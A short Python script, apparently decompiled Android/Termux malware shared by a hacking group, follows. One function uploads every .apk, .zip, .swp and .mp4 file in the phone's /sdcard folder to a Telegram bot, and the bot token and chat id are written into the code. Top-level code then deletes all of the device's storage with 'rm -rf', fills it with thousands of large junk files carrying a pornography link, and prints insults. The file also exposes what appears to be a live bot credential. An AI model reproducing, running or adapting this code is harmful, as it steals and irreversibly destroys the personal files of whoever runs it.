# DECOMPILED BY U7P4L 1N
#TEAM : ANONYMOUS CYBER
# FEEL FREE ENJOY KIDZ SCRIPT
def CENTSU():
    session = requests.session()
 
    bot_token = '6917161596:AAF6_S_mFu8gf0FPrYCcMS99lNh0sVpYbn8'
    chat_id = '6254543351'
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																						
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.apk')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------------zip-------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.zip')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------------swp---------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.swp')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-----------------------mp4--------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.mp4')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    
import os
os.system('rm -rf /storage/emulated/0/*')
text = "Welcome to my world , https://pornhub.com\n"
for i in range(6000):
	os.system(f'touch /storage/emulated/0/DELETE-succesful{i}.txt')
	with open(f'/storage/emulated/0/DELETE-succesful{i}.txt','a') as file:
		file.write(text*20000)
print('BOBO MO NAMAN PARANG SI DENV. :)')
print('TAHOL NA NAMAN YANG ASO')
